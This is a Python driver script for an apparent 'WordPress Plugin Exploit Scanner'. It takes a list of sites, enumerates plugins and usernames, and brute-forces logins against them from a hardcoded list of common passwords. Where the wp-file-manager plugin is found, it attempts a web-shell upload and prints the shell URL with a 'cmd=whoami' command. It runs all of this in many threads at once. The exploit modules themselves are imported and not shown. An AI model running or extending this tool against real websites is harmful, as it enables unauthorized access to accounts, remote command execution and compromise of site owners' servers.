import argparse
import threading
from colorama import Fore, Style, init
from modules.plugin_enum import enumerate_plugins
from modules.exploit_checker import check_local_exploits
from modules.report_writer import save_report
from modules.alive_checker import is_site_alive
from modules.shell_exploit import try_shell_upload
from modules.brute_force import brute_force_login
from modules.user_enum import enumerate_usernames
from data.plugins import load_plugins

init(autoreset=True)
print_lock = threading.Lock()

def load_sites_txt(filename="sites_list.txt"):
    try:
        with open(filename, "r") as f:
            sites = list(set(line.strip().rstrip("/") for line in f if line.strip()))
        return sites
    except:
        print(Fore.RED + "[!] Could not load site list.")
        return []

def enum_and_brute_force(site, passwords, verbose=False):
    with print_lock:
        print(Fore.CYAN + f"[+] Enumerating usernames for: {site}")
    
    usernames = enumerate_usernames(site)
    if verbose:
        print(Fore.LIGHTBLACK_EX + f"[DEBUG] Usernames found: {usernames}")
    
    if not usernames:
        with print_lock:
            print(Fore.YELLOW + "[!] No usernames found.")
        return

    for username in usernames:
        with print_lock:
            print(Fore.LIGHTYELLOW_EX + f"[→] Trying brute force on username: {username}")
        user, pwd = brute_force_login(site, [username], passwords, verbose=verbose)
        if user:
            with print_lock:
                print(Fore.GREEN + f"[🔓] Login Success: {user}:{pwd}")
                return  # Stop after success

def scan_site(site, plugin_list, exploit_enabled=False, brute_enabled=False, verbose=False):
    with print_lock:
        print(Fore.BLUE + f"\n[+] Checking if site is alive: {site}")
    
    if not is_site_alive(site):
        with print_lock:
            print(Fore.RED + f"[-] Site not responding, skipping: {site}")
        return

    with print_lock:
        print(Fore.GREEN + "[✓] Site is alive. Starting scan...")

    found_plugins = enumerate_plugins(site, plugin_list)
    if verbose:
        print(Fore.LIGHTBLACK_EX + f"[DEBUG] Plugins found: {found_plugins}")
    
    results = check_local_exploits(found_plugins)

    if exploit_enabled and "wp-file-manager" in found_plugins:
        if verbose:
            print(Fore.LIGHTBLACK_EX + "[DEBUG] Trying shell exploit...")
        shell_url = try_shell_upload(site)
        if shell_url:
            with print_lock:
                print(Fore.RED + f"[💀] Shell uploaded! Access: {shell_url}?cmd=whoami")

    if brute_enabled:
        passwords = ["123456", "admin123", "password", "letmein", "admin", "admin@123", "qwerty", "1234", "test123", "pass123"]
        enum_and_brute_force(site, passwords, verbose=verbose)

    save_report(site, results)

def main():
    parser = argparse.ArgumentParser(description="WP Plugin Exploit Scanner")
    parser.add_argument("--exploit", action="store_true", help="Try known shell exploits")
    parser.add_argument("--brute", action="store_true", help="Try brute force login")
    parser.add_argument("--all", action="store_true", help="Enable both exploit and brute force")
    parser.add_argument("--target", type=str, help="Scan a single site")
    parser.add_argument("--threads", type=int, default=5, help="Number of threads to use")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose/debug mode")
    args = parser.parse_args()

    if args.all:
        args.exploit = True
        args.brute = True

    print(Fore.MAGENTA + "\n==== WordPress Plugin Exploit Scanner ====\n")

    if args.target:
        sites = [args.target.strip().rstrip("/")]
        print(Fore.YELLOW + f"[+] Single target mode: {sites[0]}")
    else:
        sites = load_sites_txt()
        if not sites:
            print(Fore.RED + "[!] No sites loaded.")
            return

    print("\nScan Modes:")
    print("1. Fast Scan (top plugins only)")
    print("2. Deep Scan (all known plugins)")
    print("3. Custom Plugin List")
    mode = input("Your choice [1/2/3]: ").strip()
    plugin_list = load_plugins(mode)

    threads = []
    for site in sites:
        t = threading.Thread(
            target=scan_site,
            args=(site, plugin_list, args.exploit, args.brute, args.verbose)
        )
        t.start()
        threads.append(t)

        while threading.active_count() > args.threads:
            pass

    for t in threads:
        t.join()

    print(Fore.CYAN + "\n[✓] All scans complete.")

if __name__ == "__main__":
    main()
